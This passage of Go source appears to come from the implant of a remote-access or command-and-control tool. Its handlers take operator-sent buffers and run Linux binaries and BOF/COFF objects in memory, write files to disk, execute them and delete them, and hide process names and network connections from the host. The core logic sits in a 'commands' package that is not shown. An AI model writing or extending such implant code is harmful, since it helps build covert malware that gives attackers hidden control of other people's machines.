	args := string(cmdBuf[8+fileLen : 8+fileLen+argsLen])
	return commands.ExecuteLinuxBin(binBytes, args)
}

// CmdExecuteBof BOF(COFF)内存执行
func CmdExecuteBof(cmdBuf []byte) ([]byte, error) {
	// K2: 边界校验
	if len(cmdBuf) < 8 {
		return nil, errors.New("Invalid bof payload")
	}
	fileLen := binary.BigEndian.Uint32(cmdBuf[:4])
	if int(fileLen) > len(cmdBuf)-4 {
		return nil, errors.New("Invalid bof length")
	}
	coffBytes := cmdBuf[4 : 4+fileLen]
	argsLen := binary.BigEndian.Uint32(cmdBuf[4+fileLen : 8+fileLen])
	if 8+int(fileLen)+int(argsLen) > len(cmdBuf) {
		return nil, errors.New("Invalid args length")
	}
	args := string(cmdBuf[8+fileLen : 8+fileLen+argsLen])
	return commands.ExecuteBof(coffBytes, args)
}

// CmdExecuteFile 文件执行(写临时文件->执行->删除)
func CmdExecuteFile(cmdBuf []byte) ([]byte, error) {
	// K2: 边界校验
	if len(cmdBuf) < 8 {
		return nil, errors.New("Invalid exec payload")
	}
	fileLen := binary.BigEndian.Uint32(cmdBuf[:4])
	if int(fileLen) > len(cmdBuf)-4 {
		return nil, errors.New("Invalid exec length")
	}
	fileBytes := cmdBuf[4 : 4+fileLen]
	argsLen := binary.BigEndian.Uint32(cmdBuf[4+fileLen : 8+fileLen])
	if 8+int(fileLen)+int(argsLen) > len(cmdBuf) {
		return nil, errors.New("Invalid args length")
	}
	args := string(cmdBuf[8+fileLen : 8+fileLen+argsLen])
	return commands.ExecuteFile(fileBytes, args)
}

// CmdHideProcess 进程名隐藏（平台相关实现；非 Linux 返回错误）
func CmdHideProcess(cmdBuf []byte) ([]byte, error) {
	return commands.CmdHideProcess(cmdBuf)
}

// CmdHideNet 网络连接隐藏（平台相关实现；非 Linux 返回错误）
func CmdHideNet(cmdBuf []byte) ([]byte, error) {
	return commands.CmdHideNet(cmdBuf)
}
